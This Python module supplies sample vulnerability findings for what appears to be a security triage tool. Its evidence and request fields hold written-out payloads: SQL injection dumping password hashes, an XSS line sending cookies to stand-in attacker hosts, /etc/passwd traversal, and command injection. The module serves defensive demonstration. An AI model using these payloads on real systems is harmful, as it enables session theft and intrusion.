from typing import List
from ..models.schemas import (
    Finding,
    SeverityLevel,
    RiskCategory,
    RemediationStatus,
    DetectionType,
    ConfidenceLevel,
)
from .remediation_service import get_remediation_for_finding
from .risk_scorer import calculate_risk_score


def get_sample_findings() -> List[Finding]:
    """
    Generates realistic, academic demonstration vulnerability findings.
    All clearly flagged with is_sample=True and detection_source='Demonstration Data'.
    """
    samples_raw = [
        {
            "id": "DEMO-SQLI-001",
            "name": "SQL Injection (Union-Based Query Technique)",
            "category": "SQL Injection",
            "severity": "Critical",
            "detection_type": "Potential Vulnerability",
            "confidence": "High",
            "description": "Tautological UNION SELECT query payload identified in product catalog search parameter. Enables arbitrary retrieval of backend database records.",
            "evidence": "Matched pattern 'UNION SELECT username, password_hash, email FROM users--' in parameter 'category'.",
            "affected_target": "Query parameter 'category' (/api/v1/products?category=books)",
            "detection_limitation": "Static heuristic pattern match. Database dialect syntax verified without active database querying.",
            "request_snippet": "GET /api/v1/products?category=books' UNION SELECT id, username, password_hash FROM admin_users-- HTTP/1.1\nHost: portal.university-lab.internal\nUser-Agent: Mozilla/5.0",
        },
        {
            "id": "DEMO-XSS-002",
            "name": "Cross-Site Scripting (Reflected Script Tag Injection)",
            "category": "Cross-Site Scripting",
            "severity": "High",
            "detection_type": "Potential Vulnerability",
            "confidence": "High",
            "description": "Unescaped JavaScript execution payload embedded inside comment message parameter. If reflected in DOM without HTML entity encoding, executes arbitrary script in user browsers.",
            "evidence": "Matched payload '<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>' in query parameter 'msg'.",
            "affected_target": "Query parameter 'msg' (/profile/feedback?msg=...)",
            "detection_limitation": "Pattern identified in input stream. Actual trigger requires reflection into an unescaped DOM response context.",
            "request_snippet": "GET /profile/feedback?msg=<script>fetch('https://attacker.site/log?c='+document.cookie)</script> HTTP/1.1\nHost: portal.university-lab.internal\nCookie: session_id=s82kd92jd01",
        },
        {
            "id": "DEMO-TRAV-003",
            "name": "Path Traversal (Critical System File Access)",
            "category": "Path Traversal",
            "severity": "Critical",
            "detection_type": "Potential Vulnerability",
            "confidence": "High",
            "description": "Directory traversal sequence '../' coupled with access request to UNIX password file '/etc/passwd' detected in document download endpoint.",
            "evidence": "Matched traversal sequence '../../../../etc/passwd' in query parameter 'file'.",
            "affected_target": "Query parameter 'file' (/download?file=...)",
            "detection_limitation": "Rule match on file path parameters. Exploitation relies on insufficient server-side path normalization and file permission checks.",
            "request_snippet": "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: portal.university-lab.internal\nUser-Agent: Security-Triage-Agent/1.0",
        },
        {
            "id": "DEMO-IDOR-004",
            "name": "Insecure Direct Object Reference (IDOR Indicator)",
            "category": "Insecure Direct Object Reference",
            "severity": "High",
            "detection_type": "Detected Indicator",
            "confidence": "Medium",
            "description": "Sequential integer object identifier passed in invoice lookup endpoint. Susceptible to enumeration of confidential financial documents across user accounts.",
            "evidence": "URL path exposes sequential resource identifier '/api/v1/invoices/94821' without tenant scoping token.",
            "affected_target": "URL Path '/api/v1/invoices/94821'",
            "detection_limitation": "Identified sequential numeric identifier in REST route. Confirmation requires testing authorization boundaries against multi-tenant access.",
            "request_snippet": "GET /api/v1/invoices/94821 HTTP/1.1\nHost: portal.university-lab.internal\nAuthorization: Bearer student_token_demo",
        },
        {
            "id": "DEMO-INFO-005",
            "name": "Sensitive Credential Exposed in Query Parameter",
            "category": "Sensitive Information Exposure",
            "severity": "High",
            "detection_type": "Potential Vulnerability",
            "confidence": "High",
            "description": "Cryptographic JSON Web Token (JWT) and administrative database credentials passed in plain text GET query parameters.",
            "evidence": "Query parameters contain 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6...' and 'db_pass=AdminPass_2026!'.",
            "affected_target": "Query parameters 'token', 'db_pass' (/auth/callback)",
            "detection_limitation": "Pattern match against RFC7519 JWT format and sensitive credential parameter keywords.",
            "request_snippet": "GET /auth/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotShare&db_pass=AdminPass_2026! HTTP/1.1\nHost: portal.university-lab.internal",
        },
        {
            "id": "DEMO-HDR-006",
            "name": "Missing Content-Security-Policy (CSP) Defense",
            "category": "Missing Security Headers",
            "severity": "Medium",
            "detection_type": "Detected Indicator",
            "confidence": "High",
            "description": "Content-Security-Policy header is missing from web application response configuration, leaving client browsers without script execution controls.",
            "evidence": "Header 'Content-Security-Policy' is absent from HTTP header set.",
            "affected_target": "HTTP Security Headers",
            "detection_limitation": "Evaluated against HTTP envelope headers. Does not verify whether CSP meta tag is embedded in HTML bodies.",
            "request_snippet": "GET /dashboard HTTP/1.1\nHost: portal.university-lab.internal\nAccept: text/html,application/xhtml+xml",
        },
        {
            "id": "DEMO-HDR-007",
            "name": "Missing Strict-Transport-Security (HSTS)",
            "category": "Missing Security Headers",
            "severity": "Low",
            "detection_type": "Detected Indicator",
            "confidence": "High",
            "description": "HTTP Strict Transport Security header is absent, allowing unencrypted HTTP connections and leaving traffic open to SSL stripping.",
            "evidence": "Header 'Strict-Transport-Security' is absent.",
            "affected_target": "HTTP Security Headers",
            "detection_limitation": "Static header presence inspection.",
            "request_snippet": "GET / HTTP/1.1\nHost: portal.university-lab.internal",
        },
        {
            "id": "DEMO-CMDI-008",
            "name": "Command Injection (System Shell Chaining & Execution)",
            "category": "Command Injection",
            "severity": "Critical",
            "detection_type": "Potential Vulnerability",
            "confidence": "High",
            "description": "Shell pipe delimiter concatenated with 'cat /etc/passwd' and 'whoami' execution attempts detected in network utility diagnostic parameter.",
            "evidence": "Matched pattern '; whoami && cat /etc/passwd' in query parameter 'target_host'.",
            "affected_target": "Query parameter 'target_host' (/tools/ping)",
            "detection_limitation": "Static syntax analysis. Exploitation occurs if input is concatenated into an operating system shell command.",
            "request_snippet": "GET /tools/ping?target_host=127.0.0.1;+whoami+&&+cat+/etc/passwd HTTP/1.1\nHost: portal.university-lab.internal",
        },
    ]

    sample_findings: List[Finding] = []

    for raw in samples_raw:
        score, risk_cat, rationale = calculate_risk_score(
            severity=raw["severity"],
            category=raw["category"],
            affected_target=raw["affected_target"],
            confidence=raw["confidence"],
            detection_type=raw["detection_type"],
        )

        remediation_pack = get_remediation_for_finding(raw["category"], raw["name"])

        # Give a realistic mix of statuses for the demo
        status = RemediationStatus.OPEN
        if "HDR" in raw["id"]:
            status = RemediationStatus.IN_PROGRESS
        elif "DEMO-INFO-005" == raw["id"]:
            status = RemediationStatus.RESOLVED

        finding = Finding(
            id=raw["id"],
            name=raw["name"],
            category=raw["category"],
            severity=SeverityLevel(raw["severity"]),
            risk_score=score,
            risk_category=risk_cat,
            risk_rationale=rationale,
            description=raw["description"],
            evidence=raw["evidence"],
            affected_target=raw["affected_target"],
            detection_source="Demonstration Data",
            detection_type=DetectionType(raw["detection_type"]),
            confidence=ConfidenceLevel(raw["confidence"]),
            detection_limitation=raw["detection_limitation"],
            remediation_summary=remediation_pack.get("recommended_remediation", "Apply defensive fixes."),
            remediation_details=remediation_pack,
            remediation_status=status,
            request_snippet=raw["request_snippet"],
            is_sample=True,
        )
        sample_findings.append(finding)

    return sample_findings
